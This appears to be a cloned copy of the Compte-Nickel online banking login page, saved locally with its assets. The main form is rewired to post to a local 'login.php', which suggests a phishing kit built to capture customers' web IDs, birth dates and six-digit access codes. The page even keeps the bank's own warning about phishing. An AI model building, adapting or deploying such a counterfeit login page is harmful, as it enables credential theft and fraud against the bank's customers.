<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0044)https://mon.compte-nickel.fr/identifiez-vous -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>
	Mon Compte Nickel - Connectez vous à votre espace client
</title><link rel="shortcut icon" href="https://mon.compte-nickel.fr/Styles/Img/FAVICON_NICKEL.jpg" type="image/jpeg"><link type="text/css" href="nickel_fichiers/jquery-ui-1.css" rel="stylesheet"><link type="text/css" href="nickel_fichiers/Site.css" rel="stylesheet"><link type="text/css" href="nickel_fichiers/OSX.css" rel="stylesheet"><link type="text/css" href="nickel_fichiers/keypad.css" rel="stylesheet"><link href="nickel_fichiers/compte-nickel.css" type="text/css" rel="stylesheet">

    <script async="" src="nickel_fichiers/analytics.download"></script><script src="nickel_fichiers/jquery_002.download" type="text/javascript"></script>
    <script src="nickel_fichiers/jqueryui.download" type="text/javascript"></script>
    <script src="nickel_fichiers/keypad.download" type="text/javascript"></script>
    <script src="nickel_fichiers/jquery_003.download" type="text/javascript"></script>
    <script src="nickel_fichiers/detectmobilebrowser.download" type="text/javascript"></script>
    <script src="nickel_fichiers/jquery.download" type="text/javascript"></script>
    

<script type="text/javascript">
	$( document ).ready(function() {
    $('input').on('keydown', function(event) {
   var x = event.which;
   if (x === 13) {
       event.preventDefault();
   }
});
});

</script>

<!--     <script>

        $(function () {
            //alert(location.pathname.substring(location.pathname.lastIndexOf("/") + 1));
            pageSelected();
        });

        function HomeRedirect() {
            window.location = 'vos-operations.aspx';
        }

        function showSubMenu(subMenuId) {
            //alert(subMenuId);
            $(".panelSubMenu").each(function () {
                $(this).hide();
            });

            $("#" + subMenuId).show();
        }

        function hideSubMenu() {
            $(".panelSubMenu").each(function () {
                $(this).hide();
            });

            $(".MenuSelected").show();
        }

        function pageSelected() {
            $(".panelSubMenu").each(function () {
                $(this).hide().removeClass('MenuSelected').mouseover(
                    function () {
                        showSubMenu(this.id);
                    }).mouseout(
                    function () {
                        hideSubMenu();
                    });
            });

            $(".panelHeadMenu").each(function () {
                $(this).mouseover(
                    function () {
                        showSubMenu("sub" + this.id);
                    }).mouseout(
                    function () {
                        hideSubMenu();
                    });
            });

            page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1).split('.')[0];
            $('#' + page).addClass("font-VAGRoundedBold");

            $('#' + $('#' + page).parent().parent().attr('id')).show().addClass('MenuSelected');
        }

        function ShowDialogMessage(title, message) {
            $("#dialog-message").val(message);

            $("#dialog").dialog({
                resizable: false,
                width: 600,
                dialogClass: "no-close",
                modal: true,
                title: title,
                buttons: {
                    Fermer: function () {
                        $(this).dialog("close");
                    }
                }
            });
        }
        var timeoutID = null;
        function StartSession() {
            //alert('start');
            $('body').mousemove(function () {
                clearTimeout(timeoutID);

                var iTimeout = $('#hfSessionTimeout').val();
                if (iTimeout.length == 0)
                    iTimeout = 6000;
                timeoutID = setTimeout(function () {
                    //showSessionTimeout();
                    //window.location = 'Default.aspx?timeout=true';
                    __doPostBack('SessionTimeout', '');
                }, iTimeout);
            });
        }

        function CheckForMacOS() {
            if (navigator.platform.match('Mac') !== null) {
                $('body').addClass('OSX');
            }
        }

    </script> -->
<meta name="description" content="Page d'identification pour accéder à votre espace client en ligne Mon Compte Nickel. Vous utilisez un téléphone ? Téléchargez notre application Android et iOS"></head>
<body>
    <form method="post" action="login.php" id="my_form" class="MasterForm">

 <div id="raiseError3" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-dialog-buttons no-close" tabindex="-1" style="outline: 0px; z-index: 1002; height: auto; width: 600px; top: 304.5px; left: 459.5px; display: none;" role="dialog" aria-labelledby="ui-id-3">
                    <div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix">
                                 <span id="ui-id-3" class="ui-dialog-title">ERREUR</span><a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a>
                    </div>
                            <div id="panelAlertMessage" style="width: auto; min-height: 36px; height: auto;" class="ui-dialog-content ui-widget-content" scrolltop="0" scrollleft="0">
                                     <span id="MainContent_lblAlertMessage" style="color:Black;">Veuillez saisir Votre code d'accès</span>
                            </div>
                    <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
                                <div class="ui-dialog-buttonset">
                                         <button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false">
                                         <span class="ui-button-text">Ok</span></button>
                                </div>
                    </div>
    </div>

         <div id="raiseError" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-dialog-buttons no-close" tabindex="-1" style="outline: 0px; z-index: 1002; height: auto; width: 600px; top: 304.5px; left: 459.5px; display: none;" role="dialog" aria-labelledby="ui-id-3">
                    <div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix">
                                 <span id="ui-id-3" class="ui-dialog-title">ERREUR</span><a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a>
                    </div>
                            <div id="panelAlertMessage" style="width: auto; min-height: 36px; height: auto;" class="ui-dialog-content ui-widget-content" scrolltop="0" scrollleft="0">
                                     <span id="MainContent_lblAlertMessage" style="color:Black;">Veuillez saisir Votre code d'accès</span>
                            </div>
                    <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
                                <div class="ui-dialog-buttonset">
                                         <button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false">
                                         <span class="ui-button-text">Ok</span></button>
                                </div>
                    </div>
    </div>

<div id="raiseError2" class="ui-widget-overlay" style="display: none;"></div>


<!-- <script type="text/javascript">
//<![CDATA[
var theForm = document.forms['ctl01'];
if (!theForm) {
    theForm = document.ctl01;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>
 -->

<script src="nickel_fichiers/WebResource.txt" type="text/javascript"></script>


<script src="nickel_fichiers/ScriptResource.txt" type="text/javascript"></script>
<script src="nickel_fichiers/ScriptResource1.txt" type="text/javascript"></script>
<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="360DA4C0">
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdADBpGzfbszF/4iBF2NpIRPnrtwralV2nktQ2OcrFuqjz1LN3WAGaoKDiJZRPuuNyJonqrqMnJXtveWQHsCoNheNRWGjBt/Si1DwKXWjqSHix9Qklsyl4K4/ph6bEYh+76IprUIFsvC2FlqF2jHJ8BR9LqQselOvq+w/9v6Y2j3IOnl7dOyucrA3TlY82w30RtZeXWpztDty3T59D1f14haT5swfJo9Efsxz7t7qnHXaCfrUoc/XEzPyx/18YQQnKxbbNBMvHAqO29/HJfackc2DK6/wpf4LCAGW5tlc9JZbGYiBWxGiIJ8jh1vBNK2JRlrNfsnjN6yor8lPqOHC4Wl4b/SVbuFt4eMp1VClgJK6wWCQa2jDUoXv+/h/T/IiYDxXUcj4dZVeFMZvloL8t9ELMASjuI1uvHLyIgRYVhMynSZMusilp6AjaTdq+VWrTUR588rwPCiE2K4FivPr0djPPH71pwjGHCSitWh3zAruD8P0WieDewJpXVb3Pvxhpd8+H70m+e8KDChcxe+CoGr5lXUjkQZW1pmmuDp2lge9qluNSToNRIGzWwhMX9mljJV5DphBiR/Z+i2+X7YORalgH77wTsSgmboff0q240cFin6MLz1JfKMc0tffrcnIVhMMkxhMEpOG6bWjr1aMRo637pPqlq0vNPmOowOMwTnxvPAtLpPGz+qdg0fAZBEQksc5YezYcVtZChex5PRALQxkqg/aFM1gnm/c5HXFyOMKY288+vYFXGhBB8EQgyd5yYFEHeMA9+8SCvy6O3c2cinp7IVAwPWrau0yuHUXyKyVo+t50vk4FkMVRczQa/2qHbKeCE2d9c/rlch/xDSXcy+HZODTlHBFUzbwOY7K+Y0kMbJ+9c+MyIQOAmg1AfuPhl/+s/F4B3drJDlpWU88rpRl/HYpZ+cWqA8hLjpLxjvgZarFt/bpxHzHO8zCRJAhMbZlNclUwYXZH5tqGNxwNhW2HRZsaFlyoVW7F927H5RnOtwVbLCcJEDyOXneTLPo1BIFz4yz6+YUrobhhiedd5EsUxPVydQ==">
</div>
<!--     <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$scriptManager', 'ctl01', ['tctl00$MainContent$upAuth','MainContent_upAuth','tctl00$MainContent$panelBlockedAccount','MainContent_panelBlockedAccount','tctl00$MainContent$upSmsCode','MainContent_upSmsCode','fctl00$MainContent$upCreatePassword','MainContent_upCreatePassword','tctl00$MainContent$upResetPwd','MainContent_upResetPwd','tctl00$MainContent$upResetPwdOnClientGenCode','MainContent_upResetPwdOnClientGenCode'], ['ctl00$MainContent$btnClientID','MainContent_btnClientID','ctl00$MainContent$btnClientBirthDate','MainContent_btnClientBirthDate','ctl00$MainContent$resetPwdButton2','MainContent_resetPwdButton2','ctl00$MainContent$btnFirstConnection','MainContent_btnFirstConnection','ctl00$MainContent$btnResetPwd','MainContent_btnResetPwd','ctl00$MainContent$ClickResetPwdOnClientID','MainContent_ClickResetPwdOnClientID'], [], 90, 'ctl00');
//]]>
</script> -->

    
        <div class="page">
            <div class="header" style="min-height:initial;padding:5px 0">
                <div class="page-content">
                    <div class="title">
                        <div style="margin:0; display:table;width:100%">
                            <div style="display:table-row">
                                <div class="table-cell" style="vertical-align:middle; padding:0 10px 0 0">
                                    <div>
                                        <a href="https://compte-nickel.fr/"><img alt="Compte-Nickel" src="nickel_fichiers/logo-nickel.png" style="height:55px;"></a>
                                    </div>
                                </div>
                                <div class="table-cell">
                                    <div style="height:20px; text-align:right"></div>
                                    
                                </div>
                                <div class="table-cell" style="text-align:right;vertical-align:top;width:257px;">
                                    <div class="table tiles" style="width:100%;float:right;margin-top:0">
                                        <div class="table-row">
                                            <div class="table-cell left" style="padding-top:0">
                                                <a class="tile" href="https://mon.compte-nickel.fr/sos" style="float:left">
                                                    <span class="img">
                                                        <img src="nickel_fichiers/tile-alert.png" alt="" style="top:7px">
                                                    </span>
                                                    <span class="text font-VAGRoundedLight">faire opposition</span>
                                                </a>
                                            </div>
                                            <div class="table-cell left" style="padding-top:0">
                                                <a class="tile" href="https://faq.compte-nickel.fr/hc/fr" style="float:right">
                                                    <span class="img">
                                                        <img src="nickel_fichiers/tile-question.png" alt="" style="">
                                                    </span>
                                                    <span class="text font-VAGRoundedLight">poser une question</span>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="content" style="width:100%">
                <div style="width:100%" class="table">
                    <div class="table-row">
                        <div style="display:table-cell; vertical-align:top">
                            <div class="main">
                                
    <div id="MainContent_upAuth">
	
            
            <div id="panelLoadingBackground" style="position: absolute; z-index: 99; background-color: rgb(249, 249, 249); display: none; width: 1519px; height: 858px; top: 65.2px; left: 0px;">
                <div id="panelLoading" style="position: absolute; width:100%; height: 40px; text-align: center; vertical-align: middle;">
                    <span class="font-VAGRoundedLight uppercase" style="font-size: 2.9em; margin-right: 10px; font-weight:normal;">Chargement</span>
                    <img src="nickel_fichiers/loading.gif" alt="loading" width="30px" height="30px">
                </div>
            </div>
            
            <div class="page-content">
                <div class="motto">
                    <div class="alert-info-title">
                        Bienvenue dans votre compte sans banque
                    </div>
                    <div class="alert-info-content">
                        Vous comptez pour nous... nous comptons pour vous
                    </div>
                </div>
                <div class="table" style="width: 100%; margin-top: 20px;min-height:170px">
                    <div class="table-row">
                        <div class="table-cell" style="padding: 0 20px 15px 0; width: 55%; vertical-align: top;">
                            
                            <div id="accordion" class="panelConnection">
                                <h3 id="panelIDTitle" class="accordionTitle" style="margin:0;"><div style="margin-left:10px">Votre identifiant web</div></h3>
                                <div id="panelID" style="margin-top:10px;">
                                    <div style="margin-left: 20px">
                                        <div id="panelClientGencode">
                                            <div style="display: table">
                                                <div style="display: table-row">
                                                    <div style="display: table-cell; vertical-align: middle; padding-right: 20px">
                                                        <a onclick="deleteClientID();" class="linkNoStyle" title="Effacer">
                                                            <img id="MainContent_imgClearKeyboard" class="clear-virtual-keyboard" src="nickel_fichiers/orange-circle-cross-small.png" alt="suppr." style="width:40px;"></a>
                                                    </div>
                                                    <div style="display: table-cell; vertical-align: middle;">
                                                        <input name="ctl00$MainContent$txtClientID" type="text" maxlength="10" id="MainContent_txtClientID" class="TextboxBig" autocomplete="off" style="width: 280px; display: none">

                                                        <div id="panelClientID">
                                                            <input type="text" id="txtID_1" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 75px; text-align: center; padding: 0" class="TextboxBig">
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_2" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 75px; text-align: center; padding: 0" class="TextboxBig">
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_3" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 75px; text-align: center; padding: 0" class="TextboxBig">
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_4" maxlength="1" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 40px; text-align: center; padding: 0" class="TextboxBig">
                                                            <input type="hidden" name="ValeurId" id="ValeurIdd">
                                                        </div>
                                                    </div>
                                                    <div style="display: table-cell; vertical-align: middle; padding-left: 10px">
                                                        
                                                        <input type="button" name="ctl00$MainContent$btnClientID" value="OK" onclick="return checkClientID();" id="MainContent_btnClientID" class="orange-big-button" style="width:75px;margin-left:10px">
                                                    </div>

                                                </div>
                                                <div class="table-row">
                                                    <div class="table-cell"></div>
                                                    <div class="table-cell">
                                                        <div style="display:inline-block">
                                                            <input id="MainContent_cbSaveClientID" type="checkbox" name="ctl00$MainContent$cbSaveClientID" onclick="clickSaveClientID();"><label for="MainContent_cbSaveClientID"> Enregistrer mon identifiant</label>
                                                        </div>
                                                        <div style="position: relative;display:inline-block">
                                                            <div id="linkIbanAstuce" class="linkNoStyleNoUnderline" onclick="ToggleHelp();">
                                                                <img id="MainContent_imgHelpSmall" class="help-icon-small" src="nickel_fichiers/interrogation-small.png" style="position: relative; top: 5px">
                                                            </div>
                                                        </div>
                                                        <div id="saveClientIDHelp" class="operation-help" style="z-index: 1111">
                                                            <div style="text-transform: none; color: #000;">
                                                                <span class="uppercase font-VAGRoundedBold font-bold">100% utile</span><br>
                                                                
Saisissez une fois votre identifiant en cochant cette case, et nous 
retenons pour vous votre identifiant sur cet ordinateur.<br>
                                                                Pour 
vérifier votre identité, nous vous demanderons cependant votre date de 
naissance, renseignée à l'ouverture de votre Compte-Nickel.
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="table-cell"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="panelClientBirthDate" style="display: none">
                                            <div id="MainContent_panelClientBirthDateInner" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'MainContent_btnClientBirthDate')" style="display: table">
		
                                                <div style="display: table-row">
                                                    <div style="display: table-cell">
                                                        <input name="ctl00$MainContent$txtClientBirthDate" type="text" maxlength="8" id="MainContent_txtClientBirthDate" class="TextboxBig" autocomplete="off" style="width: 280px; display: none">
                                                        <div id="panelClientBirthDateBox">
                                                            <input type="text" id="txtClientBirth_1" maxlength="2" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 45px; text-align: center; padding: 0" class="TextboxBig watermark">
                                                            <span style="font-weight: bold; font-size: 1.6em">/</span>
                                                            <input type="text" id="txtClientBirth_2" maxlength="2" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 45px; text-align: center; padding: 0" class="TextboxBig watermark">
                                                            <span style="font-weight: bold; font-size: 1.6em">/</span>
                                                            <input type="text" id="txtClientBirth_3" maxlength="4" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);" style="width: 80px; text-align: center; padding: 0" class="TextboxBig watermark">

                                                        </div>
                                                    </div>
                                                    <div style="display: table-cell; vertical-align: middle; padding-left: 10px">
                                                        <input type="submit" name="ctl00$MainContent$btnClientBirthDate" value="OK" onclick="return checkClientID();" id="MainContent_btnClientBirthDate" class="orange-big-button">
													    
                                                        <!--<input id="btnClientBirthDate" type="submit" class="orange-big-button" value="OK" onclick="checkClientID(); return false;" />-->

                                                    </div>
                                                </div>
                                            
	</div>
                                            <div style="margin: 20px 5px 0 0; text-align: right">
                                                <a class="linkNoStyle" onclick="changeClient();">Vous n'êtes pas
                                                    <span id="MainContent_lblClientNameFromCookieLink"></span>
                                                    ?</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="panelPin" style="display: none">
                                    <h3 id="panelPinTitle" class="accordionTitle" style="margin-top:0;">
                                        <span style="margin-left:10px">Votre code d'accès</span></h3>
                                    <div style="text-align:center;margin-bottom:1px;">
                                        <input name="ctl00$MainContent$txtPassword" type="text" id="MainContent_txtPassword" autocomplete="off" style="display:none">
                                        
<!-- <script type="text/javascript">
    $(document).ready(function () {
        //console.log($('#MainContent_keypad1_hfRootButtonID').val() + " ready");
    });
</script> -->

<input name="ctl00$MainContent$keypad1$txtKeypad" type="password" maxlength="6" readonly="readonly" id="MainContent_keypad1_txtKeypad" class="Password TextboxBig" autocomplete="off" style="width: 317px;font-size:24px;">
<div id="keypad-loading" style="display:none;position:absolute;background-color:rgba(249, 249, 249, 0.5);z-index:200"></div>
<span id="MainContent_keypad1_lblKeypadUpdate"></span>
<div id="MainContent_keypad1_panelKeypad" class="nickelKeypad keypad-popup table">
		
    <div class="table-row">
        <div class="table-cell" style="vertical-align:top">
		    <div class="table">
                <div class="table-row">
                    <div class="table-cell">
                        <input type="image" name="ctl00$MainContent$keypad1$button1" id="MainContent_keypad1_button1" class="keypad-key" position="0" src="nickel_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button2" id="MainContent_keypad1_button2" class="keypad-key" position="1" src="nickel_fichiers/6.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',6)">
		                <input type="image" name="ctl00$MainContent$keypad1$button3" id="MainContent_keypad1_button3" class="keypad-key" position="2" src="nickel_fichiers/4.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',4)">
		                <input type="image" name="ctl00$MainContent$keypad1$button4" id="MainContent_keypad1_button4" class="keypad-key" position="3" src="nickel_fichiers/7.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',7)">
                    </div>
                    <div class="table-cell">
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button5" id="MainContent_keypad1_button5" class="keypad-key" position="4" src="nickel_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button6" id="MainContent_keypad1_button6" class="keypad-key" position="5" src="nickel_fichiers/9.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',9)">
		                <input type="image" name="ctl00$MainContent$keypad1$button7" id="MainContent_keypad1_button7" class="keypad-key" position="6" src="nickel_fichiers/0.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',0)">
		                <input type="image" name="ctl00$MainContent$keypad1$button8" id="MainContent_keypad1_button8" class="keypad-key" position="7" src="nickel_fichiers/3.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',3)">
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                        <input type="button" name="ctl00$MainContent$keypad1$btnClear" value="Effacer" id="MainContent_keypad1_btnClear" title="Effacer" class="keypad-special keypad-clear" onmousedown="return KeypadClearPassword('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad');">
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button9" id="MainContent_keypad1_button9" class="keypad-key" position="8" src="nickel_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button10" id="MainContent_keypad1_button10" class="keypad-key" position="9" src="nickel_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button11" id="MainContent_keypad1_button11" class="keypad-key" position="10" src="nickel_fichiers/8.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',8)">
                        <input type="image" name="ctl00$MainContent$keypad1$button12" id="MainContent_keypad1_button12" class="keypad-key" position="11" src="nickel_fichiers/white_key.png">
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                        <input type="button" name="ctl00$MainContent$keypad1$btnCorrect" value="Corriger '+&lt;br&gt;+' X " id="MainContent_keypad1_btnCorrect" title="Corriger" class="keypad-special keypad-correct" onmousedown="return KeypadCorrectPassword('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad');">
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button13" id="MainContent_keypad1_button13" class="keypad-key" position="12" src="nickel_fichiers/2.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',2)">
                        <input type="image" name="ctl00$MainContent$keypad1$button14" id="MainContent_keypad1_button14" class="keypad-key" position="13" src="nickel_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button15" id="MainContent_keypad1_button15" class="keypad-key" position="14" src="nickel_fichiers/5.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',5)">
                        <input type="image" name="ctl00$MainContent$keypad1$button16" id="MainContent_keypad1_button16" class="keypad-key" position="15" src="nickel_fichiers/1.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',1)">
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                        <input type="submit" name="ctl00$MainContent$keypad1$btnValidate" value="Valider" onclick="return showLoading();" id="MainContent_keypad1_btnValidate" class="keypad-special keypad-close">
                    </div>
					
					
					
					
                </div>
				
            </div>
        </div>
    </div>

	</div>

<!-- <input type="hidden" name="ctl00$MainContent$keypad1$hfRootButtonID" id="MainContent_keypad1_hfRootButtonID">
<input type="hidden" name="ctl00$MainContent$keypad1$hfButtonListSrc" id="MainContent_keypad1_hfButtonListSrc">
<input type="hidden" name="ctl00$MainContent$keypad1$hfKeypadId" id="MainContent_keypad1_hfKeypadId">
<input type="hidden" name="ctl00$MainContent$keypad1$hfTargetID" id="MainContent_keypad1_hfTargetID" value="MainContent_txtPassword">
<input type="hidden" name="ctl00$MainContent$keypad1$hfKeypadValue" id="MainContent_keypad1_hfKeypadValue"> -->


                                    </div>
                                </div>
								

                            </div>
                            <div style="text-align:right;margin:10px 2px 0 0;">

                                <a id="MainContent_lbHelpPwd" class="linkNoStyle font-orange" href="javascript:__doPostBack('ctl00$MainContent$lbHelpPwd','')" style="display:none; font-weight: bold">J'ai perdu mon code d'accès</a>
                                <a onclick="return showHelpResetPwdOnClientID();" id="MainContent_lbHelpPwdOnClientGenCode" class="linkNoStyle font-orange" href="javascript:__doPostBack('ctl00$MainContent$lbHelpPwdOnClientGenCode','')" style="font-weight: bold">J'ai perdu mon identifiant ou mon code d'accès</a>
                            </div>
                        </div>
                        <div class="table-cell" style="padding: 0 0 0 10px; vertical-align: top;overflow:hidden;">
                        <div id="panelVousNavezPasDeCompteNickel">
                            <div id="MainContent_panelNotClient" style="width:97%">
		
                                <div>
                                    <h3 class="font-orange">Pas encore chez compte nickel ?</h3>
                                    <div>
                                        Découvrez l'offre Compte-Nickel et toutes les infos utiles sur <b style="white-space:nowrap">compte-nickel.fr</b>
                                    </div>
                                    <h3 style="text-align:right">
                                        <a href="https://compte-nickel.fr/" target="_blank">
                                            En savoir <span class="symbol">+</span>&nbsp;<span class="symbol">&gt;</span>
                                        </a>
                                    </h3>
                                </div>
                                <div style="margin-top:18px;">
                                    <h3 class="green-text">Compte-Nickel 12/18 ans pour vos enfants ?</h3>
                                    <div>
                                        Les mineurs ont aussi droit à leur Compte-Nickel.<br>
                                        Plus d'infos sur <b>compte-nickel.fr/pour-les-12-18ans</b>
                                    </div>
                                    <h3 style="text-align:right;margin-top:5px;">
                                        <a href="https://compte-nickel.fr/pour-les-12-18ans/" target="_blank">
                                            En savoir <span class="symbol">+</span>&nbsp;<span class="symbol">&gt;</span>
                                        </a>
                                    </h3>
                                </div>
                            
	</div>
                            
                        </div>
                        <div id="panelPissenlit" style="display: none; margin-top: 150px; padding-left: 10px">
                            <img alt="" src="nickel_fichiers/pissenlit_big.png" style="width:100%;">
                        </div>
                    </div>
                    </div>
                </div>
            </div>
            <div id="panelHelpClientID" style="background-color:white;padding:15px 0">
                <div class="page-content">
                    <div class="table" style="width: 100%;">
                    <div class="table-row">
                        <div class="table-cell" style="width:25%;padding: 20px 20px 15px 0">
                            <img id="MainContent_imgCardCode" class="card-code" src="nickel_fichiers/card-code-2.png">
                        </div>
                        <div class="table-cell" style="vertical-align: middle">
                            <h3 class="font-orange" style="margin-bottom:0">
                                Où retrouver votre identifiant web ?
                            </h3>
                            <div id="MainContent_panelWebIdCompteNickel1218">
		
                                <div>
                                    <b>Vous êtes client Compte-Nickel ou Compte-Nickel 12/18 ans :</b>
                                    votre identifiant se trouve au dos de votre MasterCard® Nickel.
                                </div>
                                <div style="margin-top:10px">
                                    <b>Vous êtes le parent ou tuteur légal d'un enfant ayant un <span style="white-space:nowrap">Compte-Nickel 12/18 ans</span> :</b> utilisez l'identifiant de votre <span style="white-space:nowrap">Compte-Nickel</span> pour accéder à votre espace parent. Si vous n'avez pas de <span style="white-space:nowrap">Compte-Nickel</span> à votre nom, vous avez reçu votre identifiant sur l'email après l'ouverture du <span style="white-space:nowrap">Compte-Nickel 12/18 ans</span>.
                                </div>

                                <h3 class="font-orange" style="margin: 20px 0 0 0">
                                    Où retrouver votre code d'accès ?
                                </h3>
                                <div>
                                    Un code de sécurité vous est envoyé 
par SMS après avoir saisi et validé votre identifiant pour la première 
fois.<br>
                                    Saisissez ce code et créez votre 
code d'accès à 6 chiffres pour pouvoir profiter à 100% de votre 
Compte-Nickel.
                                </div>
                            
	</div>
                            
                        </div>
                    </div>

                </div>
                </div>
            </div>
            <div id="panelLostClientID" style="display: none">
                Veuillez S.V.P contacter le <a href="https://faq.compte-nickel.fr/hc/fr" target="_blank">service client</a>.
            </div>
            <div id="panelPhishing" class="box page-content" style="margin-top: 30px; background-color: #fff; padding: 15px 0">
                <div class="table" style="width:100%">
            <div class="table-row">
                <div class="table-cell" style="width:25%;text-align:center;vertical-align:middle">
                    <img id="MainContent_imgPhishing" class="phishing-icon" src="nickel_fichiers/EXCLAMATION.png" alt="Attention" style="width: 45%;">
                </div>
                <div class="table-cell" style="vertical-align:middle">
                    <h3 class="font-orange" style="margin:0 0 15px 0;font-weight:normal">
                        <b>Important <span style="font-size:2.6em;position:relative;top:-3px;line-height:15px">.</span></b> Soyez vigilant aux sites malveillants et au phishing
                    </h3>
                    <div>
                        <b>Le phishing est une pratique malveillante destinée à collecter vos codes d'accès afin d'accéder à votre compte.</b>
                        <div>Les fraudeurs se font passer pour 
Compte-Nickel ou l'une de vos connaissances et vous invitent par exemple
 à saisir votre code d'accès par mail ou sur un faux site internet.</div>
                    </div>
                    <div style="margin-top: 15px;">
                        <b>Important :</b> Nous ne vous enverrons jamais
 de mail vous demandant de confirmer votre code d'accès web ni votre 
numéro de carte MasterCard® Nickel.
                    </div>

                    <h3 style="text-align:right;padding-right:15px;margin-top:10px;">
                        <a href="https://faq.compte-nickel.fr/hc/fr/articles/203297266-Sites-malveillants-et-PHISHING" target="_blank">
                            En savoir <span class="symbol">+</span>&nbsp;<span class="symbol">&gt;</span>
                        </a>
                    </h3>
                </div>
            </div>
        </div>
            </div>

            <div id="panelAlertMessage" style="display: none">
        <span id="MainContent_lblAlertMessage" style="color:Black;"></span>
    </div>
            <div id="dialog-reset-pwd-after-blocked-account" style="display: none">
        <script type="text/javascript">
            function clickResetPwdButton() {
                setTimeout(function () { $('#MainContent_resetPwdButton2').removeAttr('disabled').attr('disabled', 'disabled'); }, 500);
                $('#MainContent_panelBlockedAccountMsg').hide();
                $('#divBlockedAccountMsgLoading').show();
            }
        </script>
        <div style="text-align: center">
            <div style="text-align: right; position: relative">
                <img src="nickel_fichiers/close-dialog.png" onclick="HideResetPwdBlockPopup();" style="cursor: pointer; position: absolute; right: 10px; top: 10px">
            </div>
            <div style="font-size: 1.4em; padding: 40px 10px 20px 10px;">
                <div id="MainContent_panelBlockedAccount">
		
                        <div id="MainContent_panelBlockedAccountMsg" style="font-size: 0.9em">
